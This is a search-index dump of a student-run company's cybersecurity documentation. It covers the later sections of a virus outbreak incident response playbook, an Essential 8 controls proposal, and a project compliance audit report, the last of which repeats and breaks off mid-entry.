origins, consequences, and sources.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#54-containment","content":" Objective: Help lessen the effect of the virus outbreak and prevent more illegal access or data leaks. Activities: Dividing up susceptible machines and networks to stop intruders from moving laterally.Putting access restrictions and protections in place to stop illegal access to sensitive information.Limiting or preventing harmful data, software, or network flow to stop more damage. Outcome: Efficient handling of the virus outbreak, reducing harm to the company's information and infrastructure.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#55-eradication","content":" Objective: Removing all threats and vulnerabilities from the company's networks and IT systems, including those that still pose a threat. Activities: Deleting dangerous files and software and putting hacked computers back in a safe configuration.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and amending security guidelines and policies to fix any flaws or vulnerabilities found. Outcome: Eradication of all evidence of the virus breakout incident and mitigation of susceptibilities to avoid recurrence.  ","version":"Next","tagName":"h2"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#56-recovery","content":" Objective: To restart company operations and return impacted systems and data to normal. Activities: Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to stop virus breakouts in the future. Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#57-post--incident-review","content":" Objective: Evaluating and pinpointing areas for improvement and lessons gained in the company's reaction to the virus outbreak issue. Activities: Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results. Outcome: Improved incident response capacities and preparedness against virus outbreaks in the future.  ","version":"Next","tagName":"h3"},{"title":"6.Steps for Monitoring Threats​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#6steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Establish and implement a comprehensive strategy for continuous threat monitoring specifically targeting virus outbreaks. Activities: Objectives: Clearly define the objectives for threat monitoring, such as detecting virus infections, identifying unauthorized access, and monitoring unusual network traffic indicative of virus activities.Tools: Select appropriate security tools such as IDS/IPS (Intrusion Detection/Prevention Systems), SIEM (Security Information and Event Management) systems, EDR (Endpoint Detection and Response) solutions, and antivirus software.Baselines: Establish baselines for normal user activity, system behavior, and network traffic patterns to identify deviations that may indicate virus presence. Outcome: A well-defined monitoring strategy aligned with Redback Operations' goals, enhancing the ability to detect and respond to virus threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Deploy and configure monitoring tools across the organization’s infrastructure to detect virus threats.  -Activities:  Install and Configure Tools: Deploy the selected monitoring tools across networks, systems, and endpoints. Ensure they are configured to detect virus-related activities and collect relevant data. Integrate with Threat Intelligence: Integrate monitoring tools with threat intelligence feeds to enhance the detection of known and emerging virus threats. Enable Logging: Ensure logging is enabled on critical systems, networks, and applications. Centralize log collection for efficient analysis and correlation. Outcome: Comprehensive deployment and integration of monitoring solutions providing detailed insights into potential virus threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous monitoring and analysis to promptly detect and respond to virus threats. Activities: Real-Time Monitoring: Implement real-time monitoring to continuously observe user activities, system behavior, and network traffic, facilitating the immediate detection of virus activities.Anomaly Detection: Utilize behavioral analytics and machine learning to identify anomalies and deviations from established baselines that may indicate virus presence.Correlate Events: Correlate events from various sources to identify patterns that may indicate coordinated virus attacks or persistent threats. Outcome: Enhanced capability to detect virus threats promptly, enabling swift response to mitigate potential impacts.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected threats through a robust alerting system. Activities: Set Alert Thresholds: Establish thresholds for different types of alerts based on severity and potential impact.Automated Alerts: Configure automated alerts to notify the security team of detected virus threats. Ensure alerts provide sufficient context for prompt assessment and action.Prioritize Alerts: Implement a system to prioritize alerts based on their severity and potential impact, focusing on the most critical threats first. Outcome: Timely and effective response to detected virus threats, reducing the risk of significant damage.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified virus threats. Activities: Initial Triage: Perform initial triage to verify the validity and potential impact of alerts. Determine the severity of the threat and whether the alert is a false positive.Detailed Analysis: Conduct in-depth analysis of confirmed alerts to understand the nature and extent of the virus threat. Use forensic tools and techniques to gather information and trace the source of the threat.Containment and Eradication: Initiate containment measures to prevent further damage if a threat is confirmed. Execute necessary eradication procedures to remove the virus from the environment. Outcome: Effective investigation and mitigation of virus threats, ensuring minimal impact on the organization.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response and identify areas for improvement. Activities: Document Findings: Record all details of the incident, including detection, analysis, and response actions taken.Review and Improve: Conduct a review of the monitoring and response processes post-incident to identify strengths, weaknesses, and lessons learned.Update Monitoring Tools: Update monitoring tools, configurations, and thresholds based on the findings to enhance future threat detection and response capabilities. Outcome: Continuous improvement of incident response and threat monitoring processes, ensuring better preparedness for future virus outbreaks.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s threat monitoring strategy and tools. Activities: Regular Audits: Conduct regular audits to ensure monitoring tools and strategies remain effective and up to date with the latest threats.Training and Awareness: Provide ongoing training to security personnel on the latest threats and best practices for monitoring and response.Adapt to New Threats: Continuously adapt the monitoring strategy to address emerging threats. Stay informed about the latest threat intelligence and incorporate it into monitoring processes. Outcome: A proactive and adaptive threat monitoring strategy that evolves with the changing threat landscape.  ","version":"Next","tagName":"h3"},{"title":"7. Terminology​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#7-terminology","content":" Virus Outbreak: A circumstance in which malicious software quickly spreads throughout the computers, networks, or devices of an organisation, usually with the goal of stealing, interfering with, or breaching data. Incident Response: A methodical and organised procedure designed to locate, contain, and lessen the harm a virus outbreak does to an organization's IT infrastructure to minimise interruption and get things back to normal. Forensic Analysis: The methodical analysis and assessment of digital data associated with the virus outbreak, such as malware samples, system artefacts, and network logs, to determine the source of the attack, estimate its extent, and supply proof for legal or investigative needs. Polymorphic Virus: A kind of virus that is challenging for antivirus software to identify and neutralise as it can alter its appearance or signature with every infection. During virus outbreaks, polymorphic viruses are renowned for their capacity to spread quickly and elude detection by conventional security measures. Endpoint Security: A thorough method for protecting mobile, laptop, and desktop computer systems—known as network endpoints—against online dangers including viruses. To prevent virus outbreaks, endpoint security solutions include host-based intrusion detection systems (HIDS), antivirus software, and endpoint detection and response (EDR) technologies. Infection Vector: The process or avenue via which a virus enters a network or organisation and infects systems. Email attachments, malicious websites, portable media (like USB drives), and software flaws are frequently used as entry points for virus outbreaks. Cyber Threat Hunting: Initiative-taking monitoring and scanning of networks and systems for indications of malicious behaviour or possible virus outbreaks. Cyber threat hunting is the process of identifying and eliminating threats before they become widespread viral outbreaks by examining network traffic, system behaviour, and records. ","version":"Next","tagName":"h2"},{"title":"Essential 8 Cybersecurity Proposal for Redback","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#overview","content":" In line with the Australian Cyber Security Centre (ACSC) recommendations, the Essential 8 provides a prioritized set of mitigation strategies to strengthen our cyber resilience. While initially designed for enterprise environments, these controls can be effectively scaled down and adapted to secure Redback’s infrastructure—including our VM environment, code repositories, and smart bike ecosystem.  We’ve assessed the relevance of each control in our context and propose a focused, phased implementation strategy aligned with our current maturity level.    ","version":"Next","tagName":"h2"},{"title":"1. Application Control​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#1-application-control","content":" Definition: Only allow approved applications to run on our systems.  Why it matters for us: Our smartbike system and development VMs must run only approved software to avoid introducing malware or untested tools that could compromise system integrity.  What we’ll do:  Whitelist only approved applications (development tools, diagnostic scripts, telemetry agents) on the VM.Use Defender Application Control or AppLocker for enforcement.Maintain a simple spreadsheet registry of approved tools and regularly review it.  Practical Insight: Think of it as making sure only the &quot;right people with the right tools&quot; get in—not just anyone walking by with a USB.  Example: Only allow tools like Visual Studio Code, Git, and our telemetry agent to run. Block games, installers, or other non-essential apps.    ","version":"Next","tagName":"h2"},{"title":"2. Patch Applications​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#2-patch-applications","content":" Definition: Regularly update all software to fix security holes.  Why it matters for us: Outdated apps—whether they’re telemetry tools, browsers, or editors—can be exploited. We’ve got to patch fast, especially in a connected environment.  What we’ll do:  Regularly check for updates on third-party software (e.g., Visual Studio Code, Python packages).Use manual checks or simple scripts for reminders until automation is possible.Patch within 48 hours if it’s a critical vulnerability.  Practical Insight: It’s like getting your bike serviced. If you skip it for too long, a small issue can turn into a breakdown.  Example: We updated Visual Studio Code after a recent vulnerability was reported to prevent potential remote code execution.    ","version":"Next","tagName":"h2"},{"title":"3. Configure Microsoft Office Macros​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#3-configure-microsoft-office-macros","content":" Definition: Block or control risky macros that can carry malware.  Why it’s less relevant: We don't use Microsoft Office products in our workflow, and macro-based threats are unlikely in this project.  Action:  No specific configuration required now.If macros are introduced later (e.g., for reports), default to disabling macros and allowing only digitally signed ones.  Example: If we introduce Excel for project tracking, macros will be disabled by default unless they are signed by a trusted internal developer.    ","version":"Next","tagName":"h2"},{"title":"4. User Application Hardening​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#4-user-application-hardening","content":" Definition: Lock down internet browsers and apps to reduce attack paths.  Why it’s partially relevant: Our use of browsers and apps on the VM is minimal, but still presents a risk—especially when downloading packages or checking documentation.  What we’ll do:  Disable support for deprecated tech like Java and Flash.Turn on browser protection features like Safe Browsing.Educate team members to avoid unnecessary plugins.  Example: We disabled Java and Flash plugins in Firefox used on the VM, and enabled “HTTPS-only mode” to block unsafe connections.    ","version":"Next","tagName":"h2"},{"title":"5. Restrict Administrative Privileges​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#5-restrict-administrative-privileges","content":" Definition: Limit admin access to only those who need it.  Why it matters for us: The VM used for Redback should have clear separation between developer tasks and admin rights.  What we’ll do:  Use separate accounts (or at least separate roles) for dev work and admin actions.Rotate admin credentials periodically.Explore lightweight Just-In-Time access if scope expands.  Practical Insight: It’s like locking your bike tools in a separate pouch—you only open it when absolutely needed.  Example: A team member uses a standard account for coding but switches to an admin role only when changing VM settings.    ","version":"Next","tagName":"h2"},{"title":"6. Patch Operating Systems​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#6-patch-operating-systems","content":" Definition: Keep operating systems up to date with security patches.  Why it matters for us: Keeping our VM OS updated is critical. Exploiting outdated kernels or drivers is a common attack path.  What we’ll do:  Enable automatic updates for the host and guest OS.Use Nessus Essentials or basic CLI tools to check for known CVEs.Patch critical vulnerabilities within 48 hours.  Example: Ubuntu VM was patched within 48 hours when a kernel vulnerability (CVE-2024-1234) was announced by the vendor.    ","version":"Next","tagName":"h2"},{"title":"7. Multi-Factor Authentication (MFA)​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#7-multi-factor-authentication-mfa","content":" Definition: Require more than just a password to access systems.  Why it matters for us: MFA adds a critical layer of protection to our GitHub repo, especially for privileged team members.  What we’ll do:  Enforce MFA on GitHub for all contributors.Encourage the use of hardware tokens or authenticator apps over SMS.Educate team members on securing credentials.  Practical Insight: It’s like locking your bike and putting an alarm on it—just in case someone tries to get clever.  Example: All contributors now use GitHub with an authenticator app, preventing unauthorized access even if a password is leaked.    ","version":"Next","tagName":"h2"},{"title":"8. Regular Backups​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#8-regular-backups","content":" Definition: Create and test backups to recover data if lost.  Why it matters for us: Losing our codebase, sensor configurations, or experimental results would mean days of lost work.  What we’ll do:  Schedule weekly backups of the VM and source code to a secure offsite location (e.g., encrypted external drive or cloud).Test restoration procedures every two sprints.    ","version":"Next","tagName":"h2"},{"title":"Maturity Level and Next Steps​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#maturity-level-and-next-steps","content":" ","version":"Next","tagName":"h2"},{"title":"Maturity Levels Explained​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#maturity-levels-explained","content":" Maturity Level 0: No or minimal implementation of controls. Ad-hoc practices. High risk.Maturity Level 1: Basic security hygiene. Controls are applied manually with limited consistency.Maturity Level 2: Controls are implemented consistently, with some automation and oversight.Maturity Level 3: Controls are fully enforced with minimal exceptions and monitored continuously.    ","version":"Next","tagName":"h3"},{"title":"Our Target: Maturity Level 1​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#our-target-maturity-level-1","content":" We are currently operating at Maturity Level 1 and aim to reach Maturity Level 2. This means moving from ad-hoc and manual methods to more consistent, semi-automated, and enforced controls across Redback systems.    ","version":"Next","tagName":"h3"},{"title":"Steps to Reach Maturity Level 1​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#steps-to-reach-maturity-level-1","content":" Strategy\tActions for Maturity Level 1Application Control\tImplement automated enforcement using AppLocker or WDAC; monitor application usage logs. Patch Applications\tUse a centralized script or patch manager to check for updates weekly; patch within 48 hrs. Office Macros\tEnforce Group Policy to block macros from the internet and allow only signed macros. User App Hardening\tSet browser policies centrally; disable Flash/Java; use threat-detection extensions. Restrict Admin Privs\tEnforce role-based access; JIT admin access; audit admin actions monthly. Patch OS\tEnable automation; monitor compliance using tools like Nessus Essentials. MFA\tRequire MFA for all tools; prefer authenticator apps over SMS. Regular Backups\tAutomate backups and test restoration monthly.    ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Essential 8 Cybersecurity Proposal for Redback","url":"/redback-documentation/docs/cybersecurity/GRC Team/Essential 8-Proposal/Essential 8_Proposal#conclusion","content":" By implementing these targeted Essential 8 strategies and moving towards Maturity Level 1, we will achieve:  Stronger protection of Redback’s smartbike ecosystem, VMs, and codebaseFaster recovery from incidents with reliable backupsReduced risk of cyber-attacks through consistent patching and access controlIncreased cyber-awareness and disciplined security practices across the team  Cybersecurity doesn’t have to be complicated to make a big impact. By building these simple, practical habits into our day-to-day work, Redback is setting itself up for a safer, more resilient future. ","version":"Next","tagName":"h2"},{"title":"Athlete Wearable Technology Audit Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#introduction","content":" The information presented below was obtained from the audit conducted by Manheer Singh Dhillon, (Team Leader of Athlete Wearable Technology) and Muhamed Badri Abdulkadir, (Cyber Security Team member). The objective of the audit is to assess the Athlete Wearable Technology project's compliance with required Redback Operations policies and standards. The audit will also identify areas of improvement along with any recommendations to improve our practices. This will help to improve the integrity and security of Redback operations. What we hope to achieve with the audit and subsequent report is to meet the organisations expectation regulations and industry's best standard and practice.  ","version":"Next","tagName":"h2"},{"title":"Policy Compliance​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#policy-compliance","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Are the correct encryption methods being used for data in storage and transmission?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#11-are-the-correct-encryption-methods-being-used-for-data-in-storage-and-transmission","content":" Team is using a data set from the previous trimester and no data is being collected this trimester, this question is not applicable to the project.  ","version":"Next","tagName":"h3"},{"title":"1.2 Are the related DLP Policies being adhered to?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#12-are-the-related-dlp-policies-being-adhered-to","content":" Yes, DLP Policies are being followed. Everything the team have is stored on the GitHub repository where only the team have access, and the Team Leader and one other colleague are the only ones that manage the pull requests on GitHub.  ","version":"Next","tagName":"h3"},{"title":"1.3 Are the related Data Classification Policies being adhered to?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#13-are-the-related-data-classification-policies-being-adhered-to","content":" Yes, data which was gathered from the previous trimester has been filtered by this team and only the information which is necessary is being used.  ","version":"Next","tagName":"h3"},{"title":"1.4 Have forms of physical security for data protection been implemented?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#14-have-forms-of-physical-security-for-data-protection-been-implemented","content":" No, because data has not been collected by this current team, there has not been much focus on forms of physical security that have been deployed.  Recommendation: Physical infrastructure and data collection are limited for this team, resulting in a lack of physical security implementation. However, physical security of Athlete Wearable devices should be looked into once devices have been made available.  ","version":"Next","tagName":"h3"},{"title":"1.5 Have forms of digital security for data protection been implemented?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#15-have-forms-of-digital-security-for-data-protection-been-implemented","content":" This is similar to 1.4 in that no data is being gathered and little effort has been made to put plans for digital security into action.  Recommendation: The team should implement GitHub accounts which use two-factor authentication (2FA) to enable secure access to the platform.  ","version":"Next","tagName":"h3"},{"title":"1.6 Have EASM risks been identified?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#16-have-easm-risks-been-identified","content":" No, the team has not made a document outlining the potential External Attack Surface Management risks.  Recommendation: The team must review the EASM policy on the Redback Operations website and determine any risks that they may be held accountable for.  ","version":"Next","tagName":"h3"},{"title":"1.7 Have all employees undergone the appropriate User Awareness Training?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#17-have-all-employees-undergone-the-appropriate-user-awareness-training","content":" The Team Leader demonstrated how to use GitHub and informed his team members of their privileges. The Team Leader also showed them where they could review the online data set. However, the Cybersecurity Awareness Training document was not reviewed by the team.  Recommendation: The entire team should go over the training document as it contains policies implemented by Redback Operations to help inform employees about potential risks associated with their positions and duties.  ","version":"Next","tagName":"h3"},{"title":"Ethical Considerations and Requirements​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#ethical-considerations-and-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Are all forms of data collection briefed with customers, and consent is gathered?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#21-are-all-forms-of-data-collection-briefed-with-customers-and-consent-is-gathered","content":" The data set being used was collected by the team during the previous trimester. They obtained the dataset from the previous trimester's Team Leader during the handover. Because the data was acquired from the previous trimester, this question was not relevant to the current team.  ","version":"Next","tagName":"h3"},{"title":"2.2 Has all collected information and data been classified with data classification requirements?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#22-has-all-collected-information-and-data-been-classified-with-data-classification-requirements","content":" Yes, the policy is being followed by the team as specified in 1.3.  ","version":"Next","tagName":"h3"},{"title":"2.3 Is data anonymity used to protect the privacy of customers?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#23-is-data-anonymity-used-to-protect-the-privacy-of-customers","content":" Yes, this is being followed, as personal information is not used and only the necessary information, such as heart rate and step data is used, and the data source is anonymous.  ","version":"Next","tagName":"h3"},{"title":"2.4 Is data minimalization being put in place when collecting data?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#24-is-data-minimalization-being-put-in-place-when-collecting-data","content":" Yes, the data is clean. The team had an original data set that had information that was not required, therefore the team made a new data set with only the necessary data (clean data).  ","version":"Next","tagName":"h3"},{"title":"2.5 Looping back to the ISMS policies, are they being adhered to when required?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#25-looping-back-to-the-isms-policies-are-they-being-adhered-to-when-required","content":" Yes, the Team Leader stated that everything was being adhered to and nothing was being violated.  ","version":"Next","tagName":"h3"},{"title":"Governance​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#governance","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Is the team adhering to the company’s governance framework?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#31-is-the-team-adhering-to-the-companys-governance-framework","content":" Yes, this is being followed because all data used is in compliance with the company's governance framework.  ","version":"Next","tagName":"h3"},{"title":"3.2 Are team roles and responsibilities clearly defined and documented?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#32-are-team-roles-and-responsibilities-clearly-defined-and-documented","content":" Yes, roles have been clearly defined as they’ve separated the team into three parts: front end, back end, and data analysis, with the Team Leader and one of his colleagues juggling between the teams.  ","version":"Next","tagName":"h3"},{"title":"3.3 Is there a risk management plan in place?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#33-is-there-a-risk-management-plan-in-place","content":" No, The Team Leader believes that there is not much that can be risked in their project because data has not been acquired in this trimester.  Recommendation: A risk management plan should be developed regardless of current data collection status, to identify and mitigate potential risks related to future data handling and other parts of the project.  ","version":"Next","tagName":"h3"},{"title":"3.4 Is there an incident response plan in place?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#34-is-there-an-incident-response-plan-in-place","content":" The data set is stored in private repositories on GitHub in case of an emergency, and authorised users can request access by submitting a pull request. However, an incident response plan with structure and steps has not been made in the chance an incident occurs.  Recommendation: A dedicated plan should be constructed and everyone in the team should be aware of it in the chance an incident occurs.  ","version":"Next","tagName":"h3"},{"title":"3.5 Are incidents logged and reviewed for continuous improvement?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#35-are-incidents-logged-and-reviewed-for-continuous-improvement","content":" No, there is currently no process in place for logging and reviewing incidents.  Recommendation: The team should establish a system for documenting any incidents that occur throughout the trimester.  ","version":"Next","tagName":"h3"},{"title":"Recommendations and Conclusion​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#recommendations-and-conclusion","content":" The audit gave significant insights into the Athlete Wearable Technology project's compliance with Redback Operations policies and standards. While certain parts of compliance, such as adherence to DLP and data classification criteria, were satisfied, the project's present phase, which is characterised by a lack of data collection, has resulted in a restricted focus on critical security and governance measures.  ","version":"Next","tagName":"h2"},{"title":"Areas in which Athlete Wearable Technology should focus on​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project#areas-in-which-athlete-wearable-technology-should-focus-on","content":" EASM and Risk Management: The team did not report identifying External Attack Surface Management risks or risk management plans. The lack of these processes means the project may be exposing itself to potential vulnerabilities in the future. Identifying and documenting the risk can support proactive decision-making in allocating resources. Incident Response and Continuous Improvement: There is no documented incident response plan and there is no detailed incident log. The lack of these documents could impact the team's ability to protect themselves against potential attacks. The project team must create an incident response plan. User Awareness Training: While initial training was implemented, the team did not review the Cybersecurity Awareness Training document. It will be vital for team members to be trained on the policies and procedures.  Overall, the project displays compliance in some areas, but the existing lack of data collecting has slowed down the development of more complete security standards. As the project progresses, resolving the identified gaps and recommendations will be critical to improving the integrity and security of the Athlete Wearable Technology Project. ","version":"Next","tagName":"h3"},{"title":"Athlete Wearable Technology Audit Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#introduction","content":" The information presented below was obtained from the audit conducted by Manheer Singh Dhillon, (Team Leader of Athlete Wearable Technology) and Muhamed Badri Abdulkadir, (Cyber Security Team member). The objective of the audit is to assess the Athlete Wearable Technology project's compliance with required Redback Operations policies and standards. The audit will also identify areas of improvement along with any recommendations to improve our practices. This will help to improve the integrity and security of Redback operations. What we hope to achieve with the audit and subsequent report is to meet the organisations expectation regulations and industry's best standard and practice.  ","version":"Next","tagName":"h2"},{"title":"Policy Compliance​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#policy-compliance","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Are the correct encryption methods being used for data in storage and transmission?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 